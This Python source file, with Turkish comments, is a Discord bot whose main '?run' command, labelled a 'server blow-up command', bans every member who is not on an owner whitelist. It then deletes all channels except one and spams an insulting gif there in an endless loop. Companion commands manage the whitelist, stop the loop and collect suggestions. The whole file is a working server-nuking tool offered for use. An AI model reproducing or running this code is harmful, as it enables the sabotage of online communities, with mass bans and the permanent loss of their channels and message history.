from discord import *
from discord.ext import commands
import discord, asyncio

intents = discord.Intents().all()
intents.message_content = True
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='?', intents=intents, help_command=None)

owner_id = int("your-profile-id")

@bot.event
async def on_ready():
    print("Logged in!")

@bot.command(name="help", description="Bu ekranı gösterir")
async def help(ctx):
    helptext = "```"
    for command in bot.commands:
        helptext+=f"{str(command)} - {command.description}\n"
    helptext+="```"
    await ctx.send(helptext)

@bot.command(description="Sunucu patlatma komudu")
async def run(ctx):

    owners=open("owners.txt","r").readlines()
    one_time = True
    own=[]
    
    for owner in owners:
        own.append(str(owner).replace("\n",""))
    if str(ctx.author.id) not in own:
        m=await ctx.reply("Sadece yapımcılarım bu komudu kullanabilir!")
        await asyncio.sleep(2)
        await m.delete()
        await ctx.message.delete()
        return

    global loop
    loop = True
    await ctx.message.delete()
    try:
        msg = await ctx.author.send('Emin misin?')
        await msg.add_reaction("✅")

        try:
            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) == '✅'
            await bot.wait_for('reaction_add', timeout=10.0, check=check)
        except:
            await msg.delete()
            m=await ctx.author.send("Doğrulama süresi sona erdi.")
            await asyncio.sleep(2)
            await m.delete()
            return
    
        await msg.delete()
    except:
        await ctx.send("Bu komudu kullanabilmeniz için DM'nize erişmeye ihtiyacım var <@{}>. Lütfen işaretli kısım eğer tikli değil ise resimdeki ayarı aktifleştirin\nhttps://media.discordapp.net/attachments/1106920494562812025/1106999086252576811/Adsz.png?width=1248&height=676".format(ctx.author.id))
        return

    for user in ctx.guild.members:
        try:
            try:
                with open("owners.txt", "r") as f:
                    users = f.readlines()
                    users_filtered=[]
                    for u in users:
                        users_filtered.append(u.replace("\n",""))
                    users = users_filtered
            except Exception as e:
                print(e)
            if str(user.id) not in users and user.id != bot.user.id:
                await user.ban(reason="None")
        except Exception as e:
            print(e)
            print("Couldn't ban", user.name)

    while loop:
        for c in ctx.guild.channels: # iterating through each guild channel
            if c.name == "hehehe":
                channel = c
                if one_time:
                    await channel.purge(limit=None)
                    one_time = False
            elif c.name != "hehehe":
                await c.delete()
        

        try:
            await channel.send("https://cdn.discordapp.com/attachments/1104165427011125258/1104165588294709259/you-are-idiot.gif")
        except:
            channel = await ctx.guild.create_text_channel('hehehe')

        await asyncio.sleep(0.5)

@bot.command(description="Botu kimin kullanabileceğini gösterir")
async def whitelist(ctx):
    try:
        with open("owners.txt", "r") as f:
            users = f.readlines()
            print(users)
            users_to_id = ""
            for user in users:
                if str(user).replace("\n","") == str(owner_id):
                    users_to_id += "<@" + str(user).replace("\n","") + "> - Bot Sahibi\n"
                else:
                    users_to_id += "<@" + str(user).replace("\n","") + ">\n"
            await ctx.send("Beni kullanabilen kullanıcılar:\n{}".format(users_to_id))
    except Exception as e:
        print(e)
        try:
            open("owners.txt","r")
        except:
            with open("owners.txt", "w") as f:
                pass
            await ctx.send("Henüz veritabanımda hiç bir kullanıcı yok. ?whitelist add ile yetkili ekleyin ya da ?whitelist remove ile yetkili kaldırın")

@bot.command(description="Kullanıma açık değil.")
@commands.is_owner()
async def clear(ctx):
        async for message in ctx.author.history(limit=100):
            if message.author == bot.user: #client.user or bot.user according to what you have named it
                await message.delete()

@bot.command(description="Sunucu patlatma işlemini durdurur")
async def stop(ctx):

    owners=open("owners.txt","r").readlines()
    one_time = True
    own=[]
    
    for owner in owners:
        own.append(str(owner).replace("\n",""))
    if str(ctx.author.id) not in own:
        m=await ctx.reply("Sadece yapımcılarım bu komudu kullanabilir!")
        await asyncio.sleep(2)
        await m.delete()
        await ctx.message.delete()

        return

    global loop
    loop = False
    try:
        warn=await ctx.author.send("Döngü durduruldu.")
        await asyncio.sleep(0.7)
        await ctx.message.delete()
        msg=await ctx.author.send("Kanalı temizlememi ister misin?")
        await msg.add_reaction("✅")

        try:
            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) == '✅'
            await bot.wait_for('reaction_add', timeout=10.0, check=check)
        except:
            await msg.delete()
            await ctx.message.delete()
            await warn.delete()
            m=await ctx.author.send("Doğrulama süresi sona erdi.")
            await asyncio.sleep(2)
            await m.delete()
            return

        for c in ctx.guild.channels: # iterating through each guild channel
            if c.name == "hehehe":
                await c.purge(limit=None)
                m=await ctx.author.send('"{}" adlı kanal temizlendi.'.format(c.name))
                await asyncio.sleep(2)
                await m.delete()
                await msg.delete()
                await warn.delete()
    except:
        await ctx.channel.purge(limit=None)


@bot.command(description="Kullanıcı komut önerisinde bulunabilir")
async def oneri(ctx, oneri: str=None, *args):

    owners=open("owners.txt","r").readlines()
    one_time = True
    own=[]
    
    for owner in owners:
        own.append(str(owner).replace("\n",""))
    if str(ctx.author.id) not in own:
        m=await ctx.reply("Sadece yapımcılarım bu komudu kullanabilir!")
        await asyncio.sleep(2)
        await m.delete()
        await ctx.message.delete()

        return
    
    if oneri == None:
        await ctx.reply("Lütfen önerinizi giriniz. (?oneri <öneriniz>)")
        return
    
    oneri = f"{oneri} " + ' '.join(args)

    if str(oneri).replace(" ","").lower() == "list":
        try:
            oneri = []
            with open("oneriler.txt","r") as f:
                for item in f.readlines():
                    onerilen = item[item.index(":"):].replace(": ", "")
                    item = item[:item.index(":")]
                    item = str(item[item.index(" "):]).replace("(","").replace(")","").replace("\n", "")
                    if item[0] == " ":
                        item = item[1:]
                    id = ""
                    for num in item:
                        if num.isdigit():
                            id += str(num)

                    oneri.append(f"<@{id}>: " + onerilen)

                oneri = ''.join(oneri)
                await ctx.reply(oneri)
        except Exception as e:
            await ctx.reply("Öneri listesi boş. Lütfen daha sonra tekrar deneyiniz.")
        return
    
    if str(oneri).replace(" ","").lower() == "clear":
        if ctx.author.id == owner_id:
            with open("oneriler.txt","w") as f:
                pass
            m = await ctx.reply("Öneri listesi temizlendi.")
            return
    try:
        with open("oneriler.txt","a") as f:
            f.write(f"{ctx.author.name} ({ctx.author.id}): {oneri}\n")
    except:
        with open("oneriler.txt", "w") as f:
            f.write(f"{ctx.author.name} ({ctx.author.id}): {oneri}\n")
    await ctx.reply("Öneriniz gönderildi: " + oneri)

bot.run("token")  # Where 'TOKEN' is your bot token
